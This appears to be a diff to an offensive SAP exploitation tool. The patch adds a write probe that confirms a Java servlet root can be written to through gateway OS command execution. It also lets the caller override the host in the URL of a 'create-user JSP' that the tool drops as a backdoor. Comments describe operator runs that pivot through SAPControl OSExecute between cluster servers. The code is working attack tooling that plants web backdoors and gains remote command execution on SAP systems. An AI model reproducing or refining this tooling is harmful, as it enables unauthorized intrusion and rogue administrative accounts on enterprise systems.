@@ -677,6 +677,39 @@ def _extract_java_inst_nr(inst_dirname: str):
     return int(m.group(1)) if m else None
 
 
+def _java_root_write_probe(exec_fn, root_path: str, linux: bool) -> bool:
+    """Verify the candidate IRJ root by actually WRITING a small
+    marker file.  Ambient directory-exists checks (`test -d`,
+    `if exist`) can succeed for ghost/empty IRJ directories on
+    non-Portal instances (SCS/ERS) — operator-reported THJ: `test -d
+    /usr/sap/THJ/J01/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root`
+    returned 0, then openssl decode said "No such file or directory"
+    when writing the JSP.  Root cause unclear (empty ghost dir, symlink
+    to nowhere, permission on parent, or sapstartsrv losing the `-d`
+    flag) but WRITING is the only test that matches the actual deploy
+    step.  Returns True when the marker was written successfully; the
+    marker is best-effort deleted.
+    """
+    import random as _wr
+    import string as _ws
+    marker = "sapmap_probe_" + "".join(
+        _wr.choice(_ws.ascii_lowercase) for _ in range(6))
+    if linux:
+        target = f"{root_path}/{marker}"
+        w = exec_fn("/usr/bin/python3",
+                     f"-c open('{target}','wb').write(b'x')")
+        ok = bool(w.get("success"))
+        if ok:
+            exec_fn("/bin/rm", f"-f {target}")
+        return ok
+    target = fr"{root_path}\{marker}"
+    w = exec_fn("cmd.exe", f'/C echo x>"{target}"')
+    ok = bool(w.get("success"))
+    if ok:
+        exec_fn("cmd.exe", f'/C del /q "{target}" 2>nul')
+    return ok
+
+
 def probe_java_root_dir(sid: str, linux: bool, exec_fn,
                           java_instance_nr: int):
     """Locate the actual Java Central Instance's IRJ servlet root on
@@ -695,6 +728,11 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
     port (5NN00 for the ACTUAL Java NN) — otherwise the JSP lands on
     disk but is unreachable.
 
+    Each candidate is validated with a WRITE PROBE (not just a
+    directory-exists test) because a ghost IRJ directory under
+    SCS/ERS instances can pass `test -d` yet still refuse writes —
+    operator-reported THJ hit this and burned 42s of chunk writes.
+
     `exec_fn` is a callable `(program, params) -> {success, exit_code,
     output}` — same shape as `sapmap_exploit.execute_os_command`.
     """
@@ -709,7 +747,9 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
             root = (f"{base}/{inst}/j2ee/cluster/apps/sap.com/"
                     f"irj/servlet_jsp/irj/root")
             r = exec_fn("/usr/bin/test", f"-d {root}")
-            if r.get("success") and r.get("exit_code", 0) == 0:
+            if (r.get("success")
+                    and r.get("exit_code", 0) == 0
+                    and _java_root_write_probe(exec_fn, root, True)):
                 return root, _extract_java_inst_nr(inst)
         # Fallback: enumerate /usr/sap/<SID>/ and try each subdir.
         r = exec_fn("/bin/ls", f"-1 {base}")
@@ -726,8 +766,9 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
                 root = (f"{base}/{inst}/j2ee/cluster/apps/"
                         f"sap.com/irj/servlet_jsp/irj/root")
                 r2 = exec_fn("/usr/bin/test", f"-d {root}")
-                if r2.get("success") and r2.get(
-                        "exit_code", 0) == 0:
+                if (r2.get("success")
+                        and r2.get("exit_code", 0) == 0
+                        and _java_root_write_probe(exec_fn, root, True)):
                     return root, _extract_java_inst_nr(inst)
         return None, None
     # Windows
@@ -741,7 +782,8 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
         out = " ".join(
             str(l) for l in (r.get("output") or [])
         ).strip().upper()
-        if "YES" in out:
+        if ("YES" in out
+                and _java_root_write_probe(exec_fn, root, False)):
             return root, _extract_java_inst_nr(inst)
     # Fallback: enumerate C:\usr\sap\<SID>\ and try each subdir.
     r = exec_fn("cmd.exe", f'/C dir /B "{base}"')
@@ -762,7 +804,8 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
         out2 = " ".join(
             str(l) for l in (r2.get("output") or [])
         ).strip().upper()
-        if "YES" in out2:
+        if ("YES" in out2
+                and _java_root_write_probe(exec_fn, root, False)):
             return root, _extract_java_inst_nr(inst)
     return None, None
 
@@ -770,7 +813,8 @@ def probe_java_root_dir(sid: str, linux: bool, exec_fn,
 def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                     chunk_size: int = 100,
                                     tmp_dir: str = "",
-                                    os_hint: str = "") -> dict:
+                                    os_hint: str = "",
+                                    jsp_host_override: str = "") -> dict:
     """Drop the create-user JSP via SAPXPG gateway OS exec.
 
     Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
@@ -1127,9 +1171,16 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         print(f"[*] {node.sid}: post-deploy size check: "
               f"{target_path} -> {st_out or '<no output>'}")
 
-    # Determine JSP URL — caller supplies the Java HTTP port
+    # Determine JSP URL — caller supplies the Java HTTP port.  The
+    # host defaults to node.hostname / node.ip, but the caller can
+    # override when the JSP was written via a SAPControl OSExecute
+    # pivot on a different host than the node record (e.g. AAS in a
+    # multi-server Java cluster where node.hostname is the PAS —
+    # writing to the AAS's disk means the JSP is only reachable on
+    # the AAS's ICM, not the PAS's).  Operator-reported JP1: pivot
+    # on srv01jp1aas, JSP URL wrongly built with srv01jp1pas → 404.
     port = 50000 + java_instance_nr * 100
-    host = node.ip or node.hostname
+    host = jsp_host_override or node.ip or node.hostname
     jsp_url = f"http://{host}:{port}/irj/{jsp_name}"
     return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
             "target_path": target_path, "method": "gw_os_exec",
